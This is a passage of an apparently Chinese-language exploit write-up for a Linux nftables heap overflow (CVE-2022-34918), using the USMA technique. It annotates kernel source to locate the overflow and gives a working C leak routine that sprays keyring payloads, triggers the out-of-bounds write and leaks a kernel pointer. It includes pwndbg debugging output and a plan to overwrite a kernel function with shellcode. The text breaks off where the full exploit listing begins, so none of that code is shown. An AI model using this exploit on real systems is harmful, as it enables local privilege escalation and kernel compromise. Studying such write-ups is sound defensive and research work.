<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">bindings</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span>		*<span class="title">table</span>;</span></span><br><span class="line">	<span class="keyword">possible_net_t</span>			net;</span><br><span class="line">	<span class="keyword">char</span>				*name;</span><br><span class="line">	u64				handle;</span><br><span class="line">	u32				ktype;</span><br><span class="line">	u32				dtype;</span><br><span class="line">	u32				objtype;</span><br><span class="line">	u32				size;</span><br><span class="line">	u8				field_len[NFT_REG32_COUNT];</span><br><span class="line">	u8				field_count;</span><br><span class="line">	u32				use;</span><br><span class="line">	<span class="keyword">atomic_t</span>			nelems;</span><br><span class="line">	u32				ndeact;</span><br><span class="line">	u64				timeout;</span><br><span class="line">	u32				gc_int;</span><br><span class="line">	u16				policy;</span><br><span class="line">	u16				udlen;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>			*udata;</span><br><span class="line">	<span class="comment">/* runtime data below here */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span>	*<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	u16				flags:<span class="number">14</span>,</span><br><span class="line">					genmask:<span class="number">2</span>;</span><br><span class="line">	u8				klen;</span><br><span class="line">	u8				dlen;</span><br><span class="line">	u8				num_exprs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span>			*<span class="title">exprs</span>[<span class="title">NFT_SET_EXPR_MAX</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">catchall_list</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>			data[]</span><br><span class="line">		__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分析 <code>nft_add_set_elem</code> 函数，确定 <code>tmpl-&gt;len</code> 的初始化过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_add_set_elem</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">			    <span class="keyword">const</span> struct nlattr *attr, u32 nlmsg_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	timeout = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		err = nf_msecs_to_jiffies64(nla[NFTA_SET_ELEM_TIMEOUT],</span><br><span class="line">					    &amp;timeout);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT) &#123;</span><br><span class="line">		timeout = <span class="built_in">set</span>-&gt;timeout;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY]) &#123;</span><br><span class="line">		err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key.val,</span><br><span class="line">					    nla[NFTA_SET_ELEM_KEY]);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line">		nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span class="built_in">set</span>-&gt;klen); <span class="comment">/* 将tmpl-&gt;len初始化为set-&gt;klen */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY_END]) &#123;</span><br><span class="line">		err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key_end.val,</span><br><span class="line">					    nla[NFTA_SET_ELEM_KEY_END]);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_parse_key;</span><br><span class="line"></span><br><span class="line">		nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="built_in">set</span>-&gt;klen); <span class="comment">/* 将tmpl-&gt;len初始化为set-&gt;klen */</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_OBJREF] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_OBJECT)) &#123;</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line">		&#125;</span><br><span class="line">		obj = nft_obj_lookup(ctx-&gt;net, ctx-&gt;table,</span><br><span class="line">				     nla[NFTA_SET_ELEM_OBJREF],</span><br><span class="line">				     <span class="built_in">set</span>-&gt;objtype, genmask);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(obj)) &#123;</span><br><span class="line">			err = PTR_ERR(obj);</span><br><span class="line">			<span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line">		&#125;</span><br><span class="line">		nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_OBJREF);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		err = nft_setelem_parse_data(ctx, <span class="built_in">set</span>, &amp;desc, &amp;elem.data.val,</span><br><span class="line">					     nla[NFTA_SET_ELEM_DATA]);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line"></span><br><span class="line">		dreg = nft_type_to_reg(<span class="built_in">set</span>-&gt;dtype);</span><br><span class="line">		list_for_each_entry(binding, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">bind_ctx</span> =</span> &#123;</span><br><span class="line">				.net	= ctx-&gt;net,</span><br><span class="line">				.family	= ctx-&gt;family,</span><br><span class="line">				.table	= ctx-&gt;table,</span><br><span class="line">				.chain	= (struct nft_chain *)binding-&gt;chain,</span><br><span class="line">			&#125;;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!(binding-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			err = nft_validate_register_store(&amp;bind_ctx, dreg,</span><br><span class="line">							  &amp;elem.data.val,</span><br><span class="line">							  desc.type, desc.len);</span><br><span class="line">			<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> err_parse_data;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (desc.type == NFT_DATA_VERDICT &amp;&amp;</span><br><span class="line">			    (elem.data.val.verdict.code == NFT_GOTO ||</span><br><span class="line">			     elem.data.val.verdict.code == NFT_JUMP))</span><br><span class="line">				nft_validate_state_update(ctx-&gt;net,</span><br><span class="line">							  NFT_VALIDATE_NEED);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len); <span class="comment">/* 将tmpl-&gt;len初始化为desc.len */</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在该函数中，<code>tmpl-&gt;len</code> 将被初始化为 <code>desc.len</code>（跟 <code>set-&gt;dlen</code> 没有必然的联系）</li>
</ul>
<p>用于控制 <code>tmpl-&gt;len</code> 大小的 <code>nft_data_desc</code> 结构体可以被用户控制，相关函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_parse_data</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">				  struct nft_data_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">				  struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">				  struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr); <span class="comment">/* 据用户输入的attr来初始化desc和data */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="built_in">set</span>-&gt;dlen) &#123; <span class="comment">/* 想要触发堆溢出,desc-&gt;len必定小于set-&gt;dlen,因此需要NFT_DATA_VERDICT标志位 */</span></span><br><span class="line">		nft_data_release(data, desc-&gt;type);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞的触发链为：</p>
<ul>
<li>nf_tables_newsetelem -&gt; nft_add_set_elem -&gt; nft_set_elem_init</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>核心步骤参考了该博客：<a target="_blank" rel="noopener" href="https://veritas501.github.io/2022_08_11_基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践/#0x02-ksymtab-make-shellcode-great-again">基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践 (veritas501.github.io)</a> </p>
<p>该 CVE 的堆溢出发生在 nftables 过滤器元素添加进入过滤器的过程（这个元素可以是任何一种可以用于过滤网络流量的类型，例如 IP 地址、端口号、协议类型等）</p>
<p>首先使用该堆溢出来覆盖 <code>user_key_payload-&gt;datalen</code> 用于泄露数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_leak</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">key_serial_t</span> id_buffer[SPRAY_KEY_CNT] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">key_serial_t</span> corrupted_key_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">leak_payload</span> <span class="title">leak_payload</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;leak_payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct leak_payload));</span><br><span class="line">    leak_payload.len = CORRUPT_SIZE;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;spraying user_key_payload ...&quot;</span>);</span><br><span class="line">    spray_keyring(id_buffer, SPRAY_KEY_CNT); <span class="comment">/* 填充user_key_payload */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free some key to create holes ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = FREE_HOLE_BEGIN; i &lt; SPRAY_KEY_CNT; i += FREE_HOLE_STEP) &#123;</span><br><span class="line">        key_revoke(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;trigger oob write ...&quot;</span>);</span><br><span class="line">    <span class="comment">/* 填充hole并尝试堆溢出(填充刚刚释放的kmalloc-32) */</span></span><br><span class="line">    add_elem_to_set(netfilter_sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME,</span><br><span class="line">                    ID, <span class="keyword">sizeof</span>(struct leak_payload), (<span class="keyword">uint8_t</span> *)&amp;leak_payload);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;checking if keyring is corrupted ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_keyring_corrupted(id_buffer, SPRAY_KEY_CNT, &amp;corrupted_key_id)) &#123;</span><br><span class="line">        <span class="comment">/* 堆喷id_buffer,查找被覆盖的user_key_payload */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;found keyring %d is corrupted!&quot;</span>, corrupted_key_id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can&#x27;t found corrupted keyring, retry ...&quot;</span>);</span><br><span class="line">        key_revokes(id_buffer, SPRAY_KEY_CNT);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;free other keyring to set rcu.func in user_key_payload ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = FREE_HOLE_BEGIN; i &lt; SPRAY_KEY_CNT; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] == corrupted_key_id) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        key_revoke(id_buffer[i]);</span><br><span class="line">        id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;searching rcu.func ...&quot;</span>);</span><br><span class="line">    leak_ptr = get_keyring_leak(corrupted_key_id); <span class="comment">// proc_fs_context_ops</span></span><br><span class="line">    <span class="keyword">if</span> (!leak_ptr) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;leak rcu.func failed&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_KEY_CNT; i++) &#123;</span><br><span class="line">            key_revoke(id_buffer[i]);</span><br><span class="line">            id_buffer[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak user_free_payload_rcu: 0x%08lx\n&quot;</span>, leak_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>user_key_payload</code> 做越界读，就可能读到 <code>rcu.func</code> 中的 <code>user_free_payload_rcu</code> 这个函数指针，从而泄露出内核代码段地址</li>
</ul>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0xffff88800fae9548</span> ◂— <span class="number">0x2fb0</span></span><br><span class="line">*RSI  <span class="number">0xffffc90000607828</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffffff81b96fdf</span> &lt;nft_set_elem_init+<span class="number">367</span>&gt;    rep movsq qword ptr [rdi], qword ptr [rsi]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff88800fae9548</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0xffff88800fae9548</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rdi <span class="number">0xffff88800fae9550</span> ◂— <span class="number">0x8000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff88800fae9558</span> ◂— <span class="string">&#x27;AAAAAAAAA&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffffc90000607828</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0xffffc90000607828</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi <span class="number">0xffffc90000607830</span> —▸ <span class="number">0xffffffff81b88000</span> (nfnetlink_rcv_batch+<span class="number">1456</span>) ◂— mov    qword ptr [r15 + <span class="number">8</span>], rax</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffc90000607838</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>user_key_payload-&gt;datalen(0xffff88800fae9550)</code> 将会被覆盖为 0x8000</li>
<li>PS：这个 <code>0xffffffff81b88000</code> 源自于之前遗留的地址，我们只会使用其最后两字节</li>
</ul>
<p>然后选择覆盖 <code>ring buffer(pg_vec)</code> 来打 USMA，将 <code>user_free_payload_rcu</code> 函数覆盖为 shellcode 即可（PS：可以使用大量的 nop 来填充 shellcode，增大打通的概率）</p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span 